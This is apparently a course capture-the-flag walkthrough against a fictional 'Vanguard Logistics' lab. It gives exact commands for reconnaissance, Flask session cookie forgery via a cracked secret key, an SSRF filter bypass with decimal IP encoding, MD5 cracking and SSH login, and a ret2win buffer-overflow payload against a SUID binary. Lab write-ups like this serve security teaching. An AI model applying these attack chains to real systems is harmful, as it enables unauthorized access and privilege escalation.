# Red Team Playbook — Vanguard Logistics CTF
## Step-by-Step Attack Walkthrough with Exact Commands

This document walks through the complete attack chain against Vanguard Logistics.
Every command is exact and tested. Run them in order.

---

## PHASE 1: RECONNAISSANCE

### 1.1 Port Scan
```bash
nmap -sV -p- -T4 <TARGET_IP>
```

**Expected output:**
```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Werkzeug/3.x.x Python/3.x.x
58229/tcp open  ssh     OpenSSH 8.x
```

You now know:
- Port 80: A Python web application (Flask/Werkzeug)
- Port 58229: SSH on a non-standard port (interesting — someone moved it)

### 1.2 Visit the Website
Open browser → `http://<TARGET_IP>`
It is a logistics company called "Vanguard Logistics".

### 1.3 Check robots.txt
```bash
curl http://<TARGET_IP>/robots.txt
```

**Expected output:**
```
User-agent: *
Allow: /
Disallow: /dashboard
Disallow: /fetch_data
Disallow: /static/js/shield.js
# Internal note: SSH maintenance port moved to 58229
```

Intel gained:
- Confirms SSH port 58229
- `/dashboard` and `/fetch_data` exist (but require auth)
- Nothing else immediately useful

---

## PHASE 2: DIRECTORY ENUMERATION

### 2.1 Run Gobuster
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10
```

If you do not have SecLists installed:
```bash
sudo apt install seclists
```

Or use dirb:
```bash
dirb http://<TARGET_IP> /usr/share/dirb/wordlists/common.txt
```

**Key discoveries:**
```
/portal     (Status: 200)   ← Hidden login page!
/backup   (Status: 200)   ← Exposed backup directory!
/about            (Status: 200)
/tracking         (Status: 200)
/contact          (Status: 200)
```

### 2.2 Check Backup Configs
```bash
curl http://<TARGET_IP>/backup/
```

See a directory listing. Download the .env.bak file:
```bash
curl http://<TARGET_IP>/backup/.env.bak
```

**Contents:**
```
STAFF_USER=jmiller
STAFF_PASS=Winter2023!         ← These are OLD/EXPIRED credentials!
INTERNAL_API_HOST=subnet_10.0.0.0/24
INTERNAL_API_PORT=5000
```

### 2.3 Try the Credentials (RABBIT HOLE)
Go to `http://<TARGET_IP>/portal`
Try `jmiller` / `Winter2023!` → **LOGIN FAILS**

These credentials are from Q1 2024 and have been rotated.
But you now know:
- There is an internal API on subnet 10.0.0.0/24 port 5000
- You need another way to get into the staff portal

---

## PHASE 3: SESSION COOKIE FORGERY (Cryptography Attack)

### 3.1 Get a Session Cookie
Visit `http://<TARGET_IP>/portal` in your browser.
Even without logging in, Flask sets a session cookie.

Open DevTools (F12) → Application tab → Cookies → find the `session` cookie.

Or use curl:
```bash
curl -v http://<TARGET_IP>/portal 2>&1 | grep "set-cookie"
```

**Example cookie value:**
```
eyJ1c2VybmFtZSI6bnVsbH0.ZjKxXg.ABC123...
```

### 3.2 Install flask-unsign
```bash
pip install flask-unsign
pip install flask-unsign[wordlist]
```

### 3.3 Decode the Cookie (see what is inside)
```bash
flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6bnVsbH0.ZjKxXg.ABC123..."
```

**Output:**
```
{'username': None}
```

This confirms it is a Flask signed session cookie.

### 3.4 Crack the SECRET_KEY
```bash
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6bnVsbH0.ZjKxXg.ABC123..." --wordlist /usr/share/wordlists/rockyou.txt
```

If you do not have rockyou.txt:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Output:**
```
[*] Session decodes to: {'username': None}
[*] Starting brute-forcer with 8 threads...
[+] Found secret key after 1523 attempts
b'shipping'
```

The SECRET_KEY is `shipping`. You can now forge any session cookie.

### 3.5 Forge an Admin Session Cookie
```bash
flask-unsign --sign --cookie "{'username': 'admin', 'role': 'admin'}" --secret "shipping"
```

**Output:**
```
eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.ZjKxXg.NEW_SIGNATURE...
```

### 3.6 Set the Forged Cookie in Browser
1. Open DevTools (F12) → Application → Cookies
2. Replace the `session` cookie value with the forged one
3. Refresh the page

You are now logged in as **admin** on the dashboard. You have access
to the "Customs API Fetcher" tool.

---

## PHASE 4: SSRF EXPLOITATION (Firewall Bypass)

### 4.1 Test the API Fetcher
On the dashboard, you see a URL input field labeled "Customs API Fetcher".
It lets you fetch external URLs — this is a Server-Side Request Forgery (SSRF) vector.

### 4.2 Attempt Direct Internal Access
Try entering: `http://10.0.0.15:5000/`

**Result:** "Internal IPs are prohibited"

The application has a blacklist filter blocking known internal IPs.

### 4.3 Bypass the Blacklist with Decimal IP Encoding
Standard SSRF bypass technique. Convert the IP to decimal:
- 10.0.0.1  →  167772161
- 10.0.0.2  →  167772162
- 10.0.0.15 →  167772175

Python helper to calculate:
```python
# Convert any IP to decimal
ip = "10.0.0.15"
parts = ip.split(".")
decimal = (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
print(decimal)  # 167772175
```

### 4.4 Sweep the Subnet
You know the subnet is 10.0.0.0/24 and port is 5000.
Write a quick script or manually try IPs in the API fetcher:

```
http://167772161:5000/    (10.0.0.1) → Connection refused
http://167772162:5000/    (10.0.0.2) → Connection refused
...
http://167772175:5000/    (10.0.0.15) → RESPONSE! API found!
```

For local testing, use `http://2130706433:5000/` (which is 127.0.0.1 in decimal).

### 4.5 Enumerate the Internal API
Enter in the fetcher: `http://167772175:5000/`  (or `http://2130706433:5000/` locally)

**Response:**
```json
{
  "service": "Vanguard Internal Secure API",
  "endpoints": ["/api/admin_keys", "/api/health", "/api/manifest_info"]
}
```

### 4.6 Extract Admin Credentials
Enter: `http://167772175:5000/api/admin_keys` (or `http://2130706433:5000/api/admin_keys`)

**Response:**
```json
{
  "user": "admin",
  "md5_hash": "5fcfd41e547a12215b173ff47fdd3739",
  "flag_location": "manifest.enc (Requires vault.key to decrypt)",
  "vault_key_path": "/opt/vanguard/data/vault.key"
}
```

### 4.7 Get Manifest Info
Enter: `http://167772175:5000/api/manifest_info` (or `http://2130706433:5000/api/manifest_info`)

**Response:** Details about where the encrypted flag file is located.

---

## PHASE 5: HASH CRACKING + SSH ACCESS

### 5.1 Crack the MD5 Hash

**Option A: Online (fast)**
Go to https://crackstation.net
Paste: `5fcfd41e547a12215b173ff47fdd3739`
Result: `trustno1`

**Option B: Using hashcat (offline)**
```bash
echo "5fcfd41e547a12215b173ff47fdd3739" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Option C: Using John the Ripper**
```bash
echo "5fcfd41e547a12215b173ff47fdd3739" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

**Result:** Password is `trustno1`

### 5.2 SSH into the Database Server
From Phase 1, you know SSH is on port 58229.
The Phase 1 design document CLAIMED password auth is disabled and only RSA keys work.
Good pentesters always verify claims — try it anyway.

```bash
ssh -p 58229 admin@<TARGET_IP>
```

When prompted, enter password: `trustno1`

**It works!** The SSH server was misconfigured — PasswordAuthentication is set to `yes`
despite the Phase 1 documentation claiming it was disabled. This is the intentional
"deception deviation" described in the project requirements.

You now have a shell on the Database Server.

---

## PHASE 6: PRIVILEGE ESCALATION via BUFFER OVERFLOW

### 6.1 Explore the File System
```bash
ls -la /opt/vanguard/
```

**Output:**
```
-rwsr-xr-x 1 root root  17000 Apr 25 2026 db_maintenance    ← SUID!
drwx------ 2 root root   4096 Apr 25 2026 data/
```

```bash
ls -la /opt/vanguard/data/
```

**Output:**
```
-rw------- 1 root root    44 Apr 25 2026 vault.key     ← NOT READABLE!
-rw-r--r-- 1 root admin  120 Apr 25 2026 manifest.enc  ← readable
-rwxr-xr-x 1 root root   980 Apr 25 2026 decrypt_flag.py
```

You can read `manifest.enc` but NOT `vault.key`. You need root access.

### 6.2 Find SUID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Output includes:**
```
/opt/vanguard/db_maintenance
```

This binary runs as ROOT (SUID bit is set). If it has a vulnerability,
you can exploit it to read root-owned files.

### 6.3 Analyze the Binary
```bash
/opt/vanguard/db_maintenance
```

**Output:**
```
╔══════════════════════════════════════════╗
║  Vanguard DB Maintenance Console v1.2    ║
║  AUTHORIZED PERSONNEL ONLY               ║
╚══════════════════════════════════════════╝

Enter maintenance key: test
[DENIED] Invalid maintenance key. This attempt has been logged.
```

It asks for a key. Let us analyze it with GDB.

### 6.4 Find the Win Function
```bash
gdb /opt/vanguard/db_maintenance
```

Inside GDB:
```
(gdb) info functions
```

**Output includes:**
```
0x0000000000401196  dump_key      ← THIS IS THE TARGET!
0x0000000000401210  check_key
0x00000000004012a0  main
```

Note the address of `dump_key`: `0x401196` (this will vary on your specific compile).

Now check the buffer size:
```
(gdb) disas check_key
```

Look for the `sub $0x40,%rsp` instruction. `0x40` = 64 bytes. That is the buffer size.
With the saved RBP (8 bytes), total padding needed = 64 + 8 = 72 bytes.

Exit GDB:
```
(gdb) quit
```

### 6.5 Craft the Exploit
The stack looks like this:
```
[  buffer: 64 bytes  ] [  saved RBP: 8 bytes  ] [  return address: 8 bytes  ]
                                                   ↑ overwrite this with
                                                     address of dump_key()
```

Create the exploit payload:
```bash
python3 -c "
import struct
padding = b'A' * 72                           # 64 (buffer) + 8 (saved RBP)
target  = struct.pack('<Q', 0x401196)          # address of dump_key()
payload = padding + target
import sys
sys.stdout.buffer.write(payload)
" | /opt/vanguard/db_maintenance
```

IMPORTANT: Replace `0x401196` with the actual address you found in Step 6.4.

**Output:**
```
╔══════════════════════════════════════════╗
║  Vanguard DB Maintenance Console v1.2    ║
╚══════════════════════════════════════════╝

Enter maintenance key:
[MAINTENANCE] Encryption Key Dump:
─────────────────────────────────
<VAULT KEY CONTENTS APPEAR HERE>
─────────────────────────────────
```

### 6.6 Save the Key
```bash
python3 -c "
import struct
padding = b'A' * 72
target  = struct.pack('<Q', 0x401196)
payload = padding + target
import sys
sys.stdout.buffer.write(payload)
" | /opt/vanguard/db_maintenance 2>/dev/null | grep -A1 "Key Dump" | tail -1 > /tmp/vault.key
```

---

## PHASE 7: DECRYPT THE FLAG

### 7.1 Decrypt manifest.enc
```bash
cd /opt/vanguard/data
cp /tmp/vault.key ./vault.key
python3 decrypt_flag.py
```

**Output:**
```
[*] Vanguard Logistics - Unauthorized Decryption Tool

[+] DECRYPTION SUCCESSFUL!
[+] EXTRACTED FLAG: flag{admin_credentials.txt}
```

---

## COMPLETE ATTACK SUMMARY

| Phase | Technique | Course Topic | Time Estimate |
|-------|-----------|--------------|---------------|
| 1 | nmap port scan | Reconnaissance | 5 min |
| 2 | Gobuster directory brute-force | Web Enumeration | 30 min |
| 3 | flask-unsign cookie forgery | Cryptography, Authentication | 15 min |
| 4 | SSRF decimal IP bypass + subnet sweep | Firewalls, Network Security | 30 min |
| 5 | MD5 rainbow table + SSH login | Weak Crypto, Auth Misconfig | 10 min |
| 6 | Stack buffer overflow (ret2win) | Buffer Overflow, Priv Escalation | 45 min |
| 7 | AES decryption with stolen key | Encryption | 2 min |

**Total estimated time: ~2-3 hours for an experienced Red Team**

---

## TO TEST LOCALLY (on your laptop without VMs)

For local testing, some steps differ:

1. Phases 1-4 work as-is (use `http://2130706433:5000/` instead of `167772175` for SSRF)
2. Phase 5: Skip SSH — you are already on the machine
3. Phase 6: Skip buffer overflow — vault.key is already in the project folder
4. Phase 7: Run `python decrypt_flag.py` directly in the project folder

The full attack chain with buffer overflow only works on the deployed VMs
where vault.key is locked behind root permissions.
